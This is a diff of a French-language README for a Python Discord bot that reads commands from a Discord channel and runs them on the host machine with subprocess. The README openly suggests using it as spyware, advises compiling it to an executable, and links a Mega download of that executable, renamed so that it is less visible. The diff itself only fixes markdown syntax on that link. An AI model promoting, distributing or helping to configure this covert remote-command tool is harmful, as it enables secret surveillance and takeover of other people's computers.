@@ -7,7 +7,7 @@ Ce programme python est un bot Discord qui va lire puis exécuter (avec `subproc
 Pour l’installer il faut télécharger le projet puis soit vous aller dans le dossier du programme puis taper la commande `pip install -r requirements.txt` ou soit, vous le convertissez en exécutable.
 Si vous voulez vous en servir comme logiciel d’espionnage alors convertissez le programme en exécutable pour n’avoir aucun problème python.
 
-Voici le lien du programme en exécutable (je l'est renommer pour éviter qu'il soit trop visible) : ![Clique ici](https://mega.nz/file/rFhSSZCZ#Dg4LmOsUFJSrZl58uzGjDy0hJBkZz-fIF_6G0bwCkWM)
+Voici le lien du programme en exécutable (je l'est renommer pour éviter qu'il soit trop visible) : [Clique ici](https://mega.nz/file/rFhSSZCZ#Dg4LmOsUFJSrZl58uzGjDy0hJBkZz-fIF_6G0bwCkWM)
 
 Pour le configurer, il faut créer un serveur Discord avec un salon pour qu’il puisse le cloner, et créer un bot discord.
 
